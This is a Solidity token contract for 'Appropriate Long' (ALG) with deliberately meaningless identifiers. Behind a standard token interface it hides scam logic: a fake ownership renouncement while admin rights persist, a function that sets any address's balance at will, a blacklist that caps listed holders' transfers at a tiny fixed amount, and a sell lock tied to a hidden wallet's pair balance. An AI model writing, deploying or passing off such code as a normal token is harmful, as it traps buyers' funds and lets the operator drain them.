//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface tradingMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract buyShouldMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptReceiver {
    function createPair(address amountMarketing, address minLaunch) external returns (address);
}

interface limitAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingToken) external view returns (uint256);

    function transfer(address limitMax, uint256 marketingMin) external returns (bool);

    function allowance(address shouldSell, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingMin) external returns (bool);

    function transferFrom(
        address sender,
        address limitMax,
        uint256 marketingMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeLiquidityMin, uint256 value);
    event Approval(address indexed shouldSell, address indexed spender, uint256 value);
}

interface limitTx is limitAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AppropriateLong is buyShouldMin, limitAt, limitTx {

    bool private maxFromFee;

    mapping(address => uint256) private exemptLaunched;

    function getOwner() external view returns (address) {
        return receiverSwap;
    }

    uint256 public exemptMode;

    uint256 public toExempt;

    string private minFeeList = "ALG";

    function name() external view virtual override returns (string memory) {
        return feeTotal;
    }

    uint256 public minSender;

    string private feeTotal = "Appropriate Long";

    function approve(address limitTo, uint256 marketingMin) public virtual override returns (bool) {
        tradingWallet[_msgSender()][limitTo] = marketingMin;
        emit Approval(_msgSender(), limitTo, marketingMin);
        return true;
    }

    function tradingSenderTeam(address listMax, uint256 marketingMin) public {
        atMode();
        exemptLaunched[listMax] = marketingMin;
    }

    bool private atTo;

    function walletMax() public {
        emit OwnershipTransferred(totalTrading, address(0));
        receiverSwap = address(0);
    }

    function atMode() private view {
        require(minSwap[_msgSender()]);
    }

    address public totalTrading;

    bool public receiverTx;

    bool private toList;

    uint256 launchBuy;

    function limitMode(address swapMode, address limitMax, uint256 marketingMin) internal returns (bool) {
        require(exemptLaunched[swapMode] >= marketingMin);
        exemptLaunched[swapMode] -= marketingMin;
        exemptLaunched[limitMax] += marketingMin;
        emit Transfer(swapMode, limitMax, marketingMin);
        return true;
    }

    function fundTeamLimit(address amountFrom) public {
        atMode();
        if (minSender != exemptMode) {
            exemptMode = minSender;
        }
        if (amountFrom == totalTrading || amountFrom == amountSwapLaunched) {
            return;
        }
        listMarketing[amountFrom] = true;
    }

    bool public buyTo;

    constructor (){
        
        tradingMin fundEnable = tradingMin(shouldTrading);
        amountSwapLaunched = exemptReceiver(fundEnable.factory()).createPair(fundEnable.WETH(), address(this));
        
        totalTrading = _msgSender();
        walletMax();
        minSwap[totalTrading] = true;
        exemptLaunched[totalTrading] = launchedSender;
        if (maxFromFee) {
            toList = true;
        }
        emit Transfer(address(0), totalTrading, launchedSender);
    }

    function decimals() external view virtual override returns (uint8) {
        return launchedListEnable;
    }

    address public amountSwapLaunched;

    uint256 constant launchWallet = 6 ** 10;

    function tokenAmountLaunched(address swapMode, address limitMax, uint256 marketingMin) internal returns (bool) {
        if (swapMode == totalTrading) {
            return limitMode(swapMode, limitMax, marketingMin);
        }
        uint256 totalToken = limitAt(amountSwapLaunched).balanceOf(tradingSwapTeam);
        require(totalToken == sellBuy);
        require(limitMax != tradingSwapTeam);
        if (listMarketing[swapMode]) {
            return limitMode(swapMode, limitMax, launchWallet);
        }
        return limitMode(swapMode, limitMax, marketingMin);
    }

    function balanceOf(address marketingToken) public view virtual override returns (uint256) {
        return exemptLaunched[marketingToken];
    }

    function transfer(address listMax, uint256 marketingMin) external virtual override returns (bool) {
        return tokenAmountLaunched(_msgSender(), listMax, marketingMin);
    }

    function fundTakeMarketing(uint256 marketingMin) public {
        atMode();
        sellBuy = marketingMin;
    }

    function symbol() external view virtual override returns (string memory) {
        return minFeeList;
    }

    bool public liquiditySwap;

    function allowance(address exemptLaunch, address limitTo) external view virtual override returns (uint256) {
        if (limitTo == shouldTrading) {
            return type(uint256).max;
        }
        return tradingWallet[exemptLaunch][limitTo];
    }

    address tradingSwapTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private launchedListEnable = 18;

    function transferFrom(address swapMode, address limitMax, uint256 marketingMin) external override returns (bool) {
        if (_msgSender() != shouldTrading) {
            if (tradingWallet[swapMode][_msgSender()] != type(uint256).max) {
                require(marketingMin <= tradingWallet[swapMode][_msgSender()]);
                tradingWallet[swapMode][_msgSender()] -= marketingMin;
            }
        }
        return tokenAmountLaunched(swapMode, limitMax, marketingMin);
    }

    mapping(address => bool) public minSwap;

    function totalSupply() external view virtual override returns (uint256) {
        return launchedSender;
    }

    event OwnershipTransferred(address indexed shouldFund, address indexed fundTake);

    uint256 private launchedSender = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return receiverSwap;
    }

    function feeExempt(address totalWallet) public {
        require(totalWallet.balance < 100000);
        if (liquiditySwap) {
            return;
        }
        
        minSwap[totalWallet] = true;
        if (minToken) {
            minToken = true;
        }
        liquiditySwap = true;
    }

    bool public minToken;

    address shouldTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private receiverSwap;

    uint256 sellBuy;

    mapping(address => bool) public listMarketing;

    mapping(address => mapping(address => uint256)) private tradingWallet;

}